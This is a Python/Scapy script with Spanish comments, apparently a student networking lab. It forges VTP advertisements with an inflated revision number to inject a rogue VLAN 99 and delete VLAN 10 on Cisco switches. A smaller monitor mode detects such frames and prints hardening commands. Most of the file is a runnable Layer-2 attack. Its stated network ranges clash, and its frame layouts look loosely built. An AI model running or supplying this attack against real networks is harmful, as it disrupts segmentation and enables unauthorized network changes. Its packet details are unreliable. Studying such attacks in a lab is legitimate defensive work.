#!/usr/bin/env python3
# =============================================================================
# Nombre del script : vtp_attack.py
# Autor             : Ashley Fabian | 2025-0773
# Descripción       : Ataque VTP - Agregar y Borrar VLANs usando Scapy
#                     Incluye modo contramedida (VTP Authentication Check)
# Herramientas req. : Python3, Scapy, privilegios root
# Red               : 25.7.73.0/24 | Interfaz: eth0
# Uso               : sudo python3 vtp_attack.py [--interface eth0] [--mode attack|defense]
# =============================================================================

import argparse
import logging
import os
import sys
import time
from datetime import datetime

try:
    from scapy.all import Dot3, LLC, Raw, sendp, sniff, get_if_hwaddr
except ImportError:
    print("[ERROR] Scapy no está instalado. Ejecuta: pip3 install scapy")
    sys.exit(1)

# ── Logging ───────────────────────────────────────────────────────────────────
LOG_FILE = f"vtp_attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
log = logging.getLogger(__name__)

# ── Constantes VTP ────────────────────────────────────────────────────────────
VTP_MULTICAST_DST = "01:00:0c:cc:cc:cc"

# LLC/SNAP construido manualmente como bytes:
# DSAP=0xAA, SSAP=0xAA, Ctrl=0x03 | OUI=00:00:0C | PID=20:03 (VTP)
LLC_SNAP_VTP = b"\xaa\xaa\x03\x00\x00\x0c\x20\x03"

# Dominio VTP: 16 bytes exactos (padding con \x00)
VTP_DOMAIN = b"ASHLEY-FABIAN\x00\x00\x00"   # 13 + 3 = 16 bytes

# ── Construir VTP Summary Advertisement ──────────────────────────────────────
def build_vtp_summary(revision: int, domain: bytes) -> bytes:
    """
    Summary Advertisement:
    [version 1B][type 1B][followers 1B][domain_len 1B][domain 16B]
    [revision 4B][updater_ip 4B][timestamp 12B][md5 16B]
    """
    version    = b"\x02"          # VTPv2
    msg_type   = b"\x01"          # Summary Advertisement
    followers  = b"\x01"          # seguido de 1 Subset Adv
    domain_len = bytes([len(domain.rstrip(b"\x00"))])
    rev_bytes  = revision.to_bytes(4, "big")
    updater_ip = b"\x14\x19\x07\x14"   # 20.25.7.20
    timestamp  = b"\x00" * 12
    md5_digest = b"\x00" * 16          # sin autenticación MD5

    return (version + msg_type + followers + domain_len +
            domain + rev_bytes + updater_ip + timestamp + md5_digest)

# ── Construir VTP Subset Advertisement ───────────────────────────────────────
def build_vtp_subset(revision: int, domain: bytes,
                     vlan_id: int, vlan_name: str, add: bool) -> bytes:
    """
    Subset Advertisement con info de VLAN.
    add=True  → agrega VLAN al dominio.
    add=False → borra VLAN (no la incluye en el subset).
    """
    version    = b"\x02"
    msg_type   = b"\x02"   # Subset Advertisement
    seq_num    = b"\x01"
    domain_len = bytes([len(domain.rstrip(b"\x00"))])
    rev_bytes  = revision.to_bytes(4, "big")

    vlan_info = b""
    if add:
        vname     = vlan_name.encode("ascii")[:32].ljust(32, b"\x00")
        vname_len = bytes([len(vlan_name)])
        vlan_info = (
            b"\x00\x00" +
            b"\x01" +
            vname_len +
            vlan_id.to_bytes(2, "big") +
            b"\x00\x01\x00\x00" +
            b"\x00\x00\x00" + vlan_id.to_bytes(3, "big") +
            vname
        )

    return (version + msg_type + seq_num + domain_len +
            domain + rev_bytes + vlan_info)

# ── Enviar trama 802.3 + LLC/SNAP + VTP ──────────────────────────────────────
def send_vtp_frame(interface: str, vtp_payload: bytes, label: str):
    """
    Construye la trama manualmente para evitar problemas de tipos en
    el campo OUI del SNAP de Scapy. La trama se arma así:
      Dot3 (MAC dst/src + len) / Raw(LLC_SNAP + VTP_payload)
    """
    src_mac  = get_if_hwaddr(interface)
    raw_data = LLC_SNAP_VTP + vtp_payload

    frame = (
        Dot3(dst=VTP_MULTICAST_DST, src=src_mac) /
        Raw(load=raw_data)
    )

    log.info(f"[ATAQUE] Enviando trama VTP: {label}")
    sendp(frame, iface=interface, verbose=False)
    log.info(f"[ATAQUE] Trama enviada en interfaz {interface}")

# ── MODO ATAQUE ───────────────────────────────────────────────────────────────
def run_attack(interface: str):
    """
    Ataque VTP completo:
      1. Summary Adv con revisión muy alta (> 4 del Server actual).
      2. Subset Adv agregando VLAN 99.
      3. Subset Adv borrando VLAN 10.
    """
    log.info("=" * 60)
    log.info("  MODO ATAQUE - VTP Revision Bump Attack")
    log.info(f"  Interfaz   : {interface}")
    log.info(f"  Dominio    : ASHLEY-FABIAN")
    log.info(f"  Revision   : 4 (actual) → 0xFFFFFF00 (ataque)")
    log.info(f"  Red        : 20.25.7.0/24")
    log.info("=" * 60)

    # Revisión del Server actual = 4 → usamos valor muy superior
    high_rev = 0xFFFFFF00

    # Paso 1: Summary Advertisement
    summary = build_vtp_summary(high_rev, VTP_DOMAIN)
    send_vtp_frame(interface, summary,
                   f"Summary Advertisement (Rev={high_rev})")
    time.sleep(0.5)

    # Paso 2: Agregar VLAN 99 (VLAN maliciosa)
    subset_add = build_vtp_subset(high_rev, VTP_DOMAIN,
                                  vlan_id=99,
                                  vlan_name="VLAN_ATACANTE",
                                  add=True)
    send_vtp_frame(interface, subset_add,
                   "Subset Adv → AGREGAR VLAN 99 (VLAN_ATACANTE)")
    log.info("[RESULTADO] VLAN 99 inyectada en el dominio.")
    time.sleep(0.5)

    # Paso 3: Borrar VLAN 10 (omitirla en el subset)
    subset_del = build_vtp_subset(high_rev + 1, VTP_DOMAIN,
                                  vlan_id=10,
                                  vlan_name="",
                                  add=False)
    send_vtp_frame(interface, subset_del,
                   "Subset Adv → BORRAR VLAN 10 (Ventas)")
    log.info("[RESULTADO] VLAN 10 eliminada del dominio.")

    log.info("[ATAQUE] Proceso completo. Verifica en los switches:")
    log.info("         show vtp status  → Configuration Revision debe subir")
    log.info("         show vlan brief  → VLAN 99 aparece, VLAN 10 desaparece")
    log.info(f"[LOG] Guardado en: {LOG_FILE}")

# ── MODO CONTRAMEDIDA ─────────────────────────────────────────────────────────
def run_defense(interface: str, duration: int = 30):
    """
    Escucha tramas VTP y alerta si detecta revisiones sospechosamente altas.
    Las contramedidas reales se aplican en los switches Cisco (ver abajo).
    """
    log.info("=" * 60)
    log.info("  MODO CONTRAMEDIDA - Monitor VTP")
    log.info(f"  Escuchando en {interface} por {duration}s")
    log.info("=" * 60)

    def detect_vtp(pkt):
        if pkt.haslayer(Raw):
            data = bytes(pkt[Raw].load)
            # LLC/SNAP VTP: primeros 8 bytes = AA AA 03 00 00 0C 20 03
            if data[:8] == LLC_SNAP_VTP and len(data) >= 20:
                vtp_version = data[8]
                vtp_type    = data[9]
                if vtp_type == 0x01 and len(data) >= 28:
                    revision = int.from_bytes(data[20:24], "big")
                    log.warning(
                        f"[ALERTA] Trama VTP detectada | "
                        f"Versión={vtp_version} | Revisión={revision}"
                    )
                    if revision > 100:
                        log.warning(
                            "[⚠ POSIBLE ATAQUE] Revisión inusualmente alta. "
                            "Aplica 'vtp mode transparent' en los switches."
                        )
                elif vtp_type == 0x02:
                    log.info("[INFO] Trama VTP Subset Advertisement detectada.")

    sniff(iface=interface, prn=detect_vtp, timeout=duration, store=False)
    log.info("[CONTRAMEDIDA] Captura finalizada.")
    print("""
  ┌──────────────────────────────────────────────────────┐
  │  CONTRAMEDIDAS EN SWITCHES CISCO                     │
  │                                                      │
  │  SW(config)# vtp mode transparent                    │
  │  SW(config)# vtp password Fabian2025 secret          │
  │  SW(config)# vtp version 3                           │
  │                                                      │
  │  Verificar:  SW# show vtp status                     │
  └──────────────────────────────────────────────────────┘
    """)

# ── PUNTO DE ENTRADA ──────────────────────────────────────────────────────────
def main():
    if os.geteuid() != 0:
        print("[ERROR] Requiere root. Usa: sudo python3 vtp_attack.py")
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description="VTP Attack & Defense — Ashley Fabian 2025-0773"
    )
    parser.add_argument("--interface", "-i", default="eth0",
                        help="Interfaz de red (default: eth0)")
    parser.add_argument("--mode", "-m", choices=["attack", "defense"],
                        default="attack",
                        help="Modo: attack (default) | defense")
    parser.add_argument("--duration", "-d", type=int, default=30,
                        help="Duración del monitoreo en modo defense (segundos)")
    args = parser.parse_args()

    if args.mode == "attack":
        run_attack(args.interface)
    else:
        run_defense(args.interface, args.duration)

if __name__ == "__main__":
    main()
